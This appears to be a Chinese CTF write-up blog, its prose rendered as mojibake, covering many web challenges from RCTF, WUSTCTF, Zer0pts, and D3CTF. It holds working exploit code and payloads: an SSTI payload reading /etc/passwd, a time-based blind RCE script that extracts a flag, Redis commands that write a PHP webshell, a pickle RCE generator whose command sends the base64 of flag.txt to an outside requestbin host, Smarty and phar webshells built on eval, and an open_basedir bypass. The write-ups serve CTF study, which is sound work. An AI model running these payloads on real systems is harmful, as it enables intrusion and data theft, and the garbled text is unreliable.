æœç´¢ä¸€ä¸‹æ‰¾åˆ°äº†ç±»ä¼¼çš„æºç  https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage é‚£ä¹ˆæ„é€ exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# coding=utf-8import urllibimport requestsclass RC4: def __init__(self, public_key=None): if not public_key: public_key = 'none_public_key' self.public_key = public_key self.index_i = 0 self.index_j = 0 self._init_box() def _init_box(self): \"\"\" åˆå§‹åŒ– ç½®æ¢ç›’ \"\"\" self.Box = [i for i in range(256)] key_length = len(self.public_key) j = 0 for i in range(256): index = ord(self.public_key[(i % key_length)]) j = (j + self.Box[i] + index) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def do_crypt(self, string): \"\"\" åŠ å¯†/è§£å¯† string : å¾…åŠ /è§£å¯†çš„å­—ç¬¦ä¸² \"\"\" out = [] for s in string: self.index_i = (self.index_i + 1) % 256 self.index_j = (self.index_j + self.Box[self.index_i]) % 256 self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j], self.Box[self.index_i] r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256 R = self.Box[r] # ç”Ÿæˆä¼ªéšæœºæ•° out.append(chr(ord(s) ^ R)) return ''.join(out)a = RC4('HereIsTreasure')payload = \"&#123;&#123; config &#125;&#125;\"payload = \"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;\"print(urllib.parse.quote(a.do_crypt(payload))) RC4ï¼ŒåŠ å¯†å’Œè§£å¯†æ˜¯ä¸€æ ·çš„å†åŠ å¯†ä¸€æ¬¡å°±ç­‰äºè§£å¯† 1.%14%19V%A5%09%0Dgl%DD%C5%0E å‘ç°ä¸è¡Œï¼Œ æç¤ºValueError: chr() arg not in range(256) å’Œä¸€äº›å…¶ä»–è„šæœ¬å¯¹æ¯”åˆ†æï¼Œåˆå§‹åŒ–ç½®æ¢ç›’ä¸­çš„ä»£ç æœ‰ç‚¹é—®é¢˜ self.Box = range(256)åº”è¯¥è½¬åŒ–ä¸ºself.Box = [i for i in range(256)] å¹¶ä¸”éœ€è¦ä½¿ç”¨python3çš„urlç¼–ç ã€‚ å‘½ä»¤æ‰§è¡Œä½†æ˜¯æ— å›æ˜¾ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿å°±ç®€å•è¯»å–/flag.txt [RCTF2019]calcalcalcä½¿ç”¨äº†æ‹Ÿæ€çš„æ„æƒ³ï¼Œå°±æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°åˆ†åˆ«è¿›å…¥ä¸‰ç§åç«¯ï¼ˆphp,python,nodejsï¼‰ï¼Œå¦‚æœè¿”å›å€¼ä¸åŒåˆ™è®¤å®šæ— æ•ˆã€‚ ç»™äº†ä¸‰ç§è¯­è¨€çš„æºç  app.py 123456789101112131415161718192021from flask import Flask, requestimport bsonimport jsonimport datetimeapp = Flask(__name__)@app.route(\"/\", methods=[\"POST\"])def calculate(): data = request.get_data() expr = bson.BSON(data).decode() if 'exec' in dir(__builtins__): del __builtins__.exec return bson.BSON.encode(&#123; \"ret\": str(eval(str(expr['expression']))) &#125;)if __name__ == \"__main__\": app.run(\"0.0.0.0\", 80) index.php 123456&lt;?phpob_start();$input = file_get_contents('php://input');$options = MongoDB\\BSON\\toPHP($input);$ret = eval('return ' . (string) $options-&gt;expression . ';');echo MongoDB\\BSON\\fromPHP(['ret' =&gt; (string) $ret]); index.js 1234567891011121314151617... (function () &#123; const Module = require('module') const _require = Module.prototype.require Module.prototype.require = (arg) =&gt; &#123; if (['os', 'child_process', 'vm', 'cluster'].includes(arg)) &#123; return null &#125; return _require.call(_require, arg) &#125; &#125;)() process.on('message', msg =&gt; &#123; const ret = eval(msg) process.send(ret) process.exit(0) &#125;) éƒ½è¿‡æ»¤äº†å„è‡ªçš„ä¸€äº›å±é™©åº“ï¼Œå…¶ä¸­phpè®¾ç½®äº†disable_function ä¸‰ç§æœåŠ¡éƒ½åœ¨å†…ç½‘ä¸­ï¼Œå› æ­¤æ— æ³•å¤–å¸¦ï¼Œå¯ä»¥è€ƒè™‘åŸºäºæ—¶é—´å»¶æ—¶çš„RCEï¼Œå‚è€ƒTime_Based_RCE åŸç†ç±»ä¼¼sqlç›²æ³¨ï¼Œå› ä¸ºå‰ç«¯ä¼šç­‰å¾…åç«¯å…¨éƒ¨å“åº”å®Œæˆæ‰ç»§ç»­æ‰§è¡Œç½‘é¡µ python å¯ä»¥è°ƒç”¨time.sleep(5)äº§ç”Ÿå»¶æ—¶æˆ–è€…set(1 for i in range(10000000)) å…¶ä¸­ç¬¬äºŒç§çš„å»¶æ—¶è¾ƒå°ï¼Œæ•°å€¼è¿‡å¤§ä¼šå†…å­˜é”™è¯¯ è¦åœ¨ä¸‰ç§è¯­è¨€ä¸­æ—¢èƒ½é€ æˆå»¶æ—¶åˆä¸crashï¼Œå¾ˆéš¾æ‰¾åˆ°ä¸€ä¸ªé€šç”¨çš„è¡¨è¾¾å¼ï¼Œæ€è·¯å¯ä»¥æ‰¾æ‰¾æ³¨é‡Šç¬¦ã€‚ //åœ¨phpå’Œnodejsä¸­è¡¨ç¤ºæ³¨é‡Šï¼Œåœ¨pythonä¸­è¡¨ç¤ºæ•´æ•°é™¤æ³• å¤§è‡´æ€è·¯å¦‚ä¸‹ 11&#x2F;&#x2F;1 and not (ord(open(&#39;&#x2F;flag&#39;).read()[0])&#x3D;&#x3D;1) and __import__(&#39;time&#39;).sleep(5) å†çœ‹çœ‹å‰ç«¯çš„é™åˆ¶ å¯ä»¥é€šè¿‡jsonä¼ ä¸€ä¸ªisVipä¸ºtrueç»•è¿‡ï¼Œè€Œæ­£åˆ™å¯ä»¥é€šè¿‡chr()+æ‹¼æ¥å­—ç¬¦ä¸²çš„æ–¹å¼ç»•è¿‡ ç„¶è€Œå¹¶æ²¡æœ‰å»¶æ—¶æ˜æ˜¾å»¶æ—¶ å†åˆ†æCTFTimeä¸Šç»™çš„è„šæœ¬ï¼Œå¦ä¸€ç§æ€è·¯ï¼šä½¿ç”¨eval()æ¥è¾¾åˆ°é€šç”¨çš„æ•ˆæœ 1eval(__import__(&#39;time&#39;).sleep(5) if ord(open(&#39;&#x2F;flag&#39;).read()[3])&gt;&#x3D;64 else 1) æµ‹è¯•æˆåŠŸ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsfrom time import timeurl = 'http://39b0719c-b348-4b9c-af1f-8f62ab554bf7.node3.buuoj.cn/calculate'def encode(payload): print('eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))) return 'eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))def query(bool_expr): payload = \"__import__('time').sleep(5) if %s else 1\" % bool_expr t = time() r = requests.post(url, json=&#123;'isVip': True, 'expression': encode(payload)&#125;) # print(r.text) delta = time() - t print(payload, delta) return delta &gt; 5def binary_search(geq_expression, l, r): eq_expression = geq_expression.replace('&gt;=', '==') while True: if (r - l) &lt; 4: for mid in range(l, r + 1): if query(eq_expression.format(num=mid)): return mid else: print('NOT FOUND') return mid = (l + r) // 2 if query(geq_expression.format(num=mid)): l = mid else: r = mid# flag_len = binary_search(\"len(open('/flag').read())&gt;=&#123;num&#125;\", 0, 100)flag_len = 50print('flag length: %d' % flag_len)flag = 'flag&#123;cef388f4-71a6-41d9-b0c1-3dcd5e3'while len(flag) &lt; flag_len: c = binary_search(\"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;\" % len(flag), 0, 128) if c: # the bs may fail due to network issues flag += chr(c) print(flag) [WUSTCTF2020]Train Yourself To Be Godly æ‰“å¼€é¡µé¢æ˜¯tomcatï¼Œå½±å“è¾ƒå¤§çš„æœ‰ä¸‰ä¸ªå†å²æ¼æ´ï¼Œè¿™é‡Œè€ƒçš„æ˜¯å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´ åˆ©ç”¨ ..;/å¯ä»¥ç©¿è¶Šç›®å½•ï¼Œä»è€Œè¿”å›ä¸Šä¸€å±‚ï¼Œ/..;/manager/htmlè¿›å…¥ç®¡ç†é¡µé¢ï¼Œå¼±å¯†ç tomcat:tomcatç™»å½•åå°ï¼Œä½†æ˜¯ç›´æ¥ä¸Šä¼ waråŒ…ç”±äºè·¯å¾„é—®é¢˜å¯¼è‡´ä¸Šä¼ å¤±è´¥ã€‚ æˆ‘ä»¬å½“å‰ç›®å½•ä¸ºexamplesï¼Œå°‘äº†ä¸€ä¸ªç›®å½•ç©¿è¶Š/..;/ï¼ŒåŠ ä¸Šä¹‹åè¿”å›401ï¼ŒåŠ ä¸ŠåŸºç¡€è®¤è¯ï¼Œè¿”å›403ï¼Œå³æƒé™ä¸å¤Ÿ æŸ¥çœ‹basicè®¤è¯çš„è¿”å›åŒ… å‘ç°æœ‰ä¸€ä¸ªPath=/managerï¼Œ æ–¹æ³•ä¸€ å®˜æ–¹wpæ˜¯ç›´æ¥å°†ä¼ wpæ—¶çš„/examplesä¿®æ”¹ä¸º/managerï¼Œè¿™æ ·cookieçš„Pathå°±å¯¹åº”äº† åŠ ä¸Šbasicè®¤è¯ï¼Œå‡ºç°403ï¼Œç„¶åæ›¿æ¢æ–°çš„setCookieå€¼ä¹Ÿè¿˜æ˜¯403ï¼Œé‚ä½œç½¢ æ–¹æ³•äºŒ å’ŒMrkaixinå¸ˆå‚…è®¨è®ºäº†ä¸‹ï¼Œä¿®æ”¹å“åº”åŒ…ä½¿Path=/..;/manger æˆ–è€…å¯ä»¥ç›´æ¥F12ä¿®æ”¹Cookie ä¼ waråŒ… å†°è [WUSTCTF2020]easywebä¸Šä¼ æ–‡ä»¶ä¹‹åå­˜åœ¨ä¸‹è½½æ“ä½œï¼Œä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 1&#x2F;download?file&#x3D;3e6916d2-645a-4d6a-8adf-9eff8ad74d89.jpeg ä¸­é—´è¿˜æŠ¥é”™å¾—åˆ°äº†è·¯å¾„ 1&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;uploads&#x2F;null (No such file or directory) /uploadsç›®å½•æ— æ³•ç›´æ¥è®¿é—®ï¼Œä½†æ˜¯å¯ä»¥é…åˆå¹½çµçŒ«æ¼æ´æ–‡ä»¶åŒ…å« https://github.com/00theway/Ghostcat-CNVD-2020-10487 å†™ä¸ª1.jsp 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls /\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å›æ˜¾æœ‰ç‚¹å¥‡æ€ªï¼Œåå¼¹shellä¹Ÿå¤±è´¥ï¼Œjspä¸èƒ½ä½¿ç”¨``åŒ…è£¹å‘½ä»¤ç›´æ¥å¸¦å‡ºï¼Œæœ€åç”¨@Mrkaixinçš„æœ¨é©¬åå¼¹shellæˆåŠŸ ###################04/10 [Zer0pts2020]phpNantokaAdmç»™äº†æºç  index.php sqliteæ•°æ®åº“ï¼Œå­˜åœ¨æ˜æ˜¾çš„sqlæ³¨å…¥ï¼Œè·Ÿè¿›is_vaild() æ„é€ å½¢å¼ 1CREATE TABLE $table (dummy1 TEXT,dummy2 TEXT,&#96;$column&#96; $type); =&gt; æœ¬åœ°æµ‹è¯•å¯ä»¥åˆ©ç”¨phpliteadmin åœ¨æ‰§è¡Œsqlè¯­å¥å‰å‡ºç°äº†å…¶ä»–æŸ¥è¯¢ 123$pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');$pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES (\"' . FLAG . '\");');$pdo-&gt;query($sql); 1ã€åœ¨åˆ›å»ºè¡¨æ—¶å¯ä»¥ç”¨asæ¥å¤åˆ¶å¦ä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨as select sql from sqlite_masteræ¥å¤åˆ¶sqlite_masterçš„sqlå­—æ®µã€‚ 2ã€ åŒå¼•å·è¢«è¿‡æ»¤äº†ï¼Œåœ¨sqliteä¸­å¯ä»¥ç”¨ä¸­æ‹¬å·[]æ¥ä»£æ›¿ã€‚ 3ã€ä½¿ç”¨as+è¡¨åˆ«åæ˜¯æŒ‡åœ¨ä¸€ä¸ªç‰¹å®šçš„ SQLite è¯­å¥ä¸­é‡å‘½åè¡¨ã€‚é‡å‘½åæ˜¯ä¸´æ—¶çš„æ”¹å˜ï¼Œåœ¨æ•°æ®åº“ä¸­å®é™…çš„è¡¨çš„åç§°ä¸ä¼šæ”¹å˜ã€‚ åˆ—åˆ«åç”¨æ¥ä¸ºæŸä¸ªç‰¹å®šçš„ SQLite è¯­å¥é‡å‘½åè¡¨ä¸­çš„åˆ—ã€‚ å’Œå…¶ä»–æ•°æ®åº“ç±»ä¼¼ï¼Œåˆ«åçš„å…³é”®å­—aså¯ä»¥è¢«çœç•¥ æ„é€ å¦‚ä¸‹ 1CREATE TABLE a as select sql as[ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2); =&gt; 1table_name&#x3D;a as select sql as[&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2 ç¬¬äºŒæ¬¡æŸ¥è¯¢ 1table_name&#x3D;a as select flag_2a2d04c3 as[&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2 [Zer0pts2020]musicblogæŸ¥çœ‹æºç ï¼Œå‘ç°flagåœ¨worker.jsä¸­è®¾ç½®åœ¨æµè§ˆå™¨UAä¸­ adminä¼šè‡ªåŠ¨ç‚¹å‡»#likeæ ‡ç­¾ è§‚å¯Ÿæ’å…¥contentçš„åœ°æ–¹ è€Œè¿™ä¸ªstrip_tags()å­˜åœ¨bug strip_tags site:bugs.php.net https://bugs.php.net/bug.php?id=78814 &lt;audio&gt;æ ‡ç­¾å—CSPé™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨bugæ„é€ ä¸€ä¸ª&lt;a&gt;æ ‡ç­¾ç»•è¿‡CSPçš„é™åˆ¶ æ„é€ &lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa è‡ªå·±æµ‹è¯•ä¸‹æˆåŠŸè·³è½¬ï¼Œç„¶åç­‰å¾…adminç‚¹å‡»å³å¯ [Zer0pts2020]Can you guess it?æºç  $_SERVER[&#39;PHP_SELF&#39;]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œ æ„é€ /index.php/config.php?source ä½†æ˜¯è¿™é‡Œæ­£åˆ™åŒ¹é…/config\\.php\\/*$/i åŒ¹é…å½¢å¼å¦‚config.php///çš„å­—ç¬¦ä¸² æœç´¢basename()çš„bug basename site:bugs.php.net https://bugs.php.net/bug.php?id=62119 basename()ä¼šä¸¢å¼ƒæ–‡ä»¶åä¸­éASCIIå­—ç¬¦ã€‚ åŠ åœ¨ç»“å°¾ï¼Œå¯ä»¥æˆåŠŸç»•è¿‡æ­£åˆ™/index.php/config.php/%ff?source [Zer0pts2020]urlapp https://www.anquanke.com/post/id/200927 urlç¼©çŸ­ï¼Œç”¨rediså­˜å‚¨ æŸ¥çœ‹redisé…ç½®æ–‡ä»¶ ç¦ç”¨äº†ä¸€äº›æŒ‡ä»¤ å¤„ç†è¿‡ç¨‹ å¦‚æœæ˜¯POSTè¯·æ±‚ï¼Œå¯¹ä¼ å…¥çš„urlè¿›è¡Œæ­£åˆ™æ£€æµ‹ï¼Œè°ƒç”¨set()å‡½æ•° ç›¸å½“äºå‘é€rediså‘½ä»¤ï¼Œè¿™é‡Œå­˜åœ¨CRLFæ³¨å…¥ï¼Œç›´æ¥æ“ä½œredisã€‚ æ¯”å¦‚å¸¸è§çš„äº›shellæˆ–è€…å®šæ—¶ä»»åŠ¡ 12345flushallconfig set dir &#x2F;var&#x2F;wwwconfig set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo();?&gt;&quot;save ä½†æ˜¯å¸¸ç”¨çš„redisæ‰§è¡Œè¢«ç¦ç”¨ï¼Œæ¯”å¦‚CONFIG å‚è€ƒwpï¼Œè¿™é‡Œæ‰¾åˆ°äº†BITOPå‘½ä»¤ï¼Œå¯ä»¥å¯¹keyåšä½è¿ç®—ï¼Œå¹¶æŠŠç»“æœä¿å­˜åˆ°æ–°keyé‡Œã€‚ https://redis.io/commands/bitop æ„é€ 16ä½ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶å 12SET tmp 1BITOP XOR abababababababab flag tmp å³å†™å…¥ababababababababä¸­ ä¸€å¼€å§‹qè®¿é—®å‡ºç°404 è¿™é‡Œçš„æ€è·¯æ˜¯åˆ©ç”¨setbitæŠŠæŸä¸€ä½å˜æˆ? æˆ–è€…/ 1å’Œfå¼‚æˆ–å¾—åˆ°W 12W&#x3D;&gt;01010111?&#x3D;&gt;00111111 ä½¿ç”¨setbitè®²Wè½¬åŒ–ä¸º? 12345SET tmp 1BITOP XOR abababababababab flag tmpsetbit abababababababab 1 0setbit abababababababab 2 1setbit abababababababab 4 1 [Zer0pts2020]notepadflaskæ¡†æ¶ å¤„ç†404é¡µé¢å­˜åœ¨æ˜æ˜¾çš„æ¨¡æ¿æ³¨å…¥ è·Ÿè¿›valid_url() é•¿åº¦é™åˆ¶ä¸º16ï¼Œç†è®ºä¸Šåªèƒ½è¯»å–ä¸€äº›é…ç½®å¸¸é‡ åˆ©ç”¨sstiè¯»å–configä¸­çš„secret_keyï¼Œé…åˆflaskçš„sessionä¼ªé€  ssti å¾—åˆ°&#39;SECRET_KEY&#39;: b&#39;\\xcb\\xcf\\x89\\x82\\x9e\\xfed\\x82\\xcck\\x98\\xa8\\xaf\\x956\\xf8&#39; pickleååºåˆ—åŒ–RCE 123456789import _pickle as cPickleimport sysimport base64COMMAND &#x3D; sys.argv[1]class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,))print base64.b64encode(base64.b64encode(cPickle.dumps(PickleRce()))) æ³¨æ„è¿™é‡Œè¦base64ç¼–ç ä¸¤æ¬¡ =&gt; 12[root@glotozz ~]# python3 1.py &quot;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rswxb2rs?a&#x3D;\\&#96;cat flag.txt |base64\\&#96;&quot;b&#39;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&#39; flaskçš„sessionä¼ªé€  åŸå§‹æ•°æ® 1b&#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOZGNRQjljUUVvV0FRQUFBQmtZWFJsY1FKWUV3QUFBREl3TWpBdE1EUXRNVEFnTVRFNk5USTZNak54QTFnRUFBQUFkR1Y0ZEhFRVdBQUFBQUJ4QlZnRkFBQUFkR2wwYkdWeEJsZ0tBQUFBS2s1bGR5Qk9iM1JsS25FSGRXRXU&#x3D;&quot;&#125;&#125;&#39; ä¼ªé€  1python3 flask_session_cookie_manager3.py encode -t &#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&quot;&#125;&#125;&#39; -s &#39;\\xcb\\xcf\\x89\\x82\\x9e\\xfed\\x82\\xcck\\x98\\xa8\\xaf\\x956\\xf8&#39; æ²¡æˆåŠŸï¼Œæ€è·¯åº”è¯¥å·®ä¸å¤šï¼Œæœ‰ç©ºå†çœ‹ï¼ˆå’• [D3CTF 2019]EasyWebåŸºäºcodeigniteræ¡†æ¶ application/controllers/User.php è·Ÿè¿›get_view() è¿™é‡Œçš„æ–¹æ³•è°ƒç”¨é¡ºåºå­˜åœ¨æ˜æ˜¾çš„é€»è¾‘é”™è¯¯å¯ä»¥äºŒæ¬¡sqlæ³¨å…¥ï¼Œå†é…åˆsmartyæ¨¡æ¿æ³¨å…¥ usernameå¤„å¯ä»¥æ—¶é—´ç›²æ³¨çˆ†åº“ï¼Œä½†æ˜¯æœ€åå‘ç°flagä¸åœ¨æ•°æ®åº“ä¸­ templates/index/koocola.tplä¸­æç¤º 123Hi, &#123;&#123;$username.username&#125;&#125;, hope you have a good experience in this ctf game&lt;br&gt;you must get a RCE Bug in this challenge è”åˆæ³¨å…¥+smartyæ¨¡æ¿æ³¨å…¥ æ ¹æ®ä¾‹å­æ³¨æ„è¿™é‡Œéœ€è¦ä¸¤å¯¹{}æ¥æ¸²æŸ“ 123&#123;&#123;$smarty.version&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D# 3.1.33ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°{php}å®ç°RCE 123&#123;&#123;php&#125;&#125;eval($_GET[cmd]);&#123;&#123;&#x2F;php&#125;&#125;&#x3D;&gt;g&#39; u&#123;nion s&#123;elect 0x7b7b7068707d7d6576616c28245f4745545b636d645d293b7b7b2f7068707d7d# å¦‚æœ{php}è¢«å¼ƒç”¨ï¼Œå› ä¸ºè¿™é‡Œå­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜å¯ä»¥å°è¯•é…åˆ{include}å»RCE #######################04/11 [D3CTF 2019]EzUploadç»™äº†æºç  __construct()ä¸­æ–°å»ºäº†ç›®å½• ä¸‰ä¸ªcheckæ–¹æ³• ç»è¿‡checkåæ–‡ä»¶å†™å…¥ã€‚æ–‡ä»¶å†…å®¹ä»ä¼ å…¥çš„urlè¯»å–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å…è®¸è¯»å–è¿œç¨‹æ–‡ä»¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨vpsä¸Šè®¾ç½®æ–‡ä»¶ã€‚ checkdir()æ£€æŸ¥äº†$this-&gt;userdirï¼Œå…ˆæ”¾ç€ checkurl()ç¦æ­¢äº†urlå‡ºç°php|fileï¼Œé˜²æ­¢ä½¿ç”¨ä¸¤ç§ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œé™¤äº†vpsä¸Šè®¾ç½®æ–‡ä»¶è¿˜å¯ä»¥ä½¿ç”¨data://åè®® checkext()ç¦æ­¢äº†filenameå‡ºç°..ã€/ã€phï¼Œå¯ä»¥æƒ³åˆ°.htaccess åœ¨upload()ä¸­è¿˜å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œ ä¸‹é¢ä¸¤ç§å¸¸ç”¨çš„æ— æ³•ä½¿ç”¨ 12AddType application&#x2F;x-httpd-php .jpgphp_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot; å¯ä»¥ä½¿ç”¨ 1AddHandler php7-script .txt å°è¯•å†™å…¥.htaccess 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess .htaccesså†™å…¥æˆåŠŸï¼Œä½†__destruct()ä¸­çš„file_put_contents()å†™å…¥å¤±è´¥ æ’æŸ¥ä¸‹æ˜¯è·¯å¾„çš„é—®é¢˜ï¼Œåœ¨__destruct()ä¸­åŠ ä¸€ä¸ªvar_dump(system(&#39;pwd&#39;)); å¾—åˆ°__destruct()çš„é»˜è®¤ç›®å½•æ˜¯/ï¼Œå› æ­¤æ²¡æœ‰å†™å…¥æƒé™ã€‚ä¸Šé¢æˆ‘ä»¬è™½ç„¶æˆåŠŸå†™å…¥äº†.htaccessï¼Œä½†æ˜¯ä»ç„¶æ— æ³•å†™å…¥phpæ ¼å¼çš„æ–‡ä»¶ï¼Œé™¤éç»•è¿‡upload()ä¸­çš„è¿‡æ»¤ã€‚ å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–è‡ªåŠ¨è§¦å‘__destruct()ä¸­çš„file_put_contents()ï¼Œå¹¶ä¸”pharå¯ä»¥è¿›è¡Œgzipå‹ç¼©ï¼Œä»è€Œç»•è¿‡å¯¹ä¸€äº›å­—ç¬¦çš„æ£€æŸ¥ã€‚ ç¬¬ä¸€æ­¥ï¼Œå¯»æ‰¾pharååºåˆ—åŒ–è§¦å‘ç‚¹ï¼Œå¯ä»¥é€šè¿‡upload()æ–¹æ³•ä¸­çš„ $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048); ç¬¬äºŒæ­¥ï¼Œè·å–upload/ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡__destruct()ä¸­çš„ echo $string; è§¦å‘__toString()ï¼Œæ‰“å°__DIR__ å…ˆè·å–ç»å¯¹è·¯å¾„ 12345678910111213141516171819&lt;?php class dir&#123; public $userdir; public function __construct() &#123; $this-&gt;userdir = '../'; &#125; &#125; $a = new dir(); $a -&gt; userdir = new dir(); // var_dump($a); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; é‡å‘½åä¸º1ï¼Œè¿›è¡Œgzipå‹ç¼©å¹¶æ”¾åˆ°vpsä¸Š 1action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;1.gz&amp;filename&#x3D;gqyy.phar.gz ç»å¯¹è·¯å¾„ä¸º/var/www/html/6c19fec38725c11d/upload/76d9f00467e5ee6abc3ca60892ef304e å†™å…¥phpæ ¼å¼çš„txtæ–‡ä»¶ 1234567891011121314151617181920&lt;?php class dir&#123; public $userdir; public $filename; public function __construct() &#123; $this-&gt;filename = '/var/www/html/52aee03d2e0f909e/upload/76d9f00467e5ee6abc3ca60892ef304e/gqy';//è¿™é‡Œä¸éœ€è¦åŠ åç¼€ $this-&gt;userdir = 'aa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'; &#125; &#125; $a = new dir(); // var_dump($a); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; ç»è¿‡gzipå‹ç¼©ä¹‹åä»æœ‰å¯èƒ½å‡ºç°è¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ·»åŠ ä¸€äº›é¢å¤–çš„æ•°æ® 1action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;4.gz&amp;filename&#x3D;g.phar.gz 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess è®¿é—® æœ€åç»•è¿‡open_basedirå’Œdisable_function buuçš„ç¯å¢ƒæœ‰ç‚¹è¿·ï¼ŒPOSTä¼ å‚çš„ä¸€å¥è¯æŠ¥404ï¼Œæœ€åä½¿ç”¨GETä¼ å‚æˆåŠŸ 1chdir('..');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/')); é¢„æœŸè§£æ˜¯çˆ†ç ´ç›®å½• [D3CTF 2019]Showhubæºç  å®šä½åˆ°æ¼æ´ç‚¹ Models/Model.php sprintf()æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ä¸€å¥è¯æ¦‚æ‹¬ï¼šå¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª\\,é‚£ä¹ˆphpä¼šæŠŠ\\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰, æœ€å%\\ï¼ˆæˆ–%1$\\ï¼‰è¢«æ›¿æ¢ä¸ºç©ºã€‚ è¿™é‡Œadminå¯†ç hashå€¼æ— æ³•åæ¨ã€‚å¯ä»¥åˆ©â½¤ON DUPLICATE KEY UPDATE 